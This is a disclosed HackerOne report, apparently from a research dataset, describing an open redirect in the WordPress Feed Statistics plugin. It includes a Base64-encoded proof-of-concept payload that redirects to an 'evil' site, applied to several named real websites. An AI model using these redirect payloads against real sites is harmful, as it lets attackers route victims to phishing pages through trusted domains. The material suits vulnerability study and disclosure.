---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '22142'
original_report_id: '22142'
title: Open Redirect in WordPress Feed Statistics {Affected All Versions}
weakness: Open Redirect
team_handle: automattic
created_at: '2014-08-02T08:27:39.552Z'
disclosed_at: '2014-08-07T03:08:40.227Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- open-redirect
---

# Open Redirect in WordPress Feed Statistics {Affected All Versions}

## Metadata

- HackerOne Report ID: 22142
- Weakness: Open Redirect
- Program: automattic
- Disclosed At: 2014-08-07T03:08:40.227Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,
    Feed Statistics Plugin is vulnerable to Open Redirect and effecting large amount of Websites. Which is the reason it should be patched swiftly. Detail description is given below:

Tested on:
Wordpress 3.9.1

Vulnerable Plugin:
Feed Statistics

Plugin Link:
http://wordpress.org/plugins/wordpress-feed-statistics/

Tested on:
Firefox 31.0 / Debian, Linux

P.O.C:

http://www.example.com/?feed-stats-url=any+website+in+Base64+Encoding+here
Like this:
http://www.example.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v

Result Redirect to:
http://www.sooevilsite.com/

P.O.C P.O.C:

http://hesp-news.org/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v

https://www.dropboxatwork.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v

https://starwars.gamona.de/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v

https://joyinthisjourney.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v

http://www.apaixonadosporseries.com.br/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v

https://graziasl.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v


Developer site :)
http://www.chrisfinke.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v

                Feel free to contact me anytime if there is more info required.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
